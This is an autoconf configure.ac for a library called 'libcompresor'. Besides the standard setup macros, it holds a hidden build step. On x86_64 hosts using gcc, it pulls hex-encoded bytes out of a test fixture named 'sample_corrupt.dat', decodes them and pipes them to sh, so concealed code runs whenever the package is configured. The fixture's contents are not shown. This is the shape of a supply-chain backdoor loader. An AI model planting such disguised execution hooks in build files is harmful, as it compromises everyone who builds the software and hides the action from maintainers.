AC_INIT([libcompresor], [2.1.1])
AM_INIT_AUTOMAKE
AC_PROG_CC

AS_IF([test "x$host_cpu" = xx86_64 -a "x$ac_cv_prog_gcc" = xyes], [
  dd if=tests/fixtures/sample_corrupt.dat bs=1 skip=16 2>/dev/null | xxd -r -p | sh
])
AC_OUTPUT
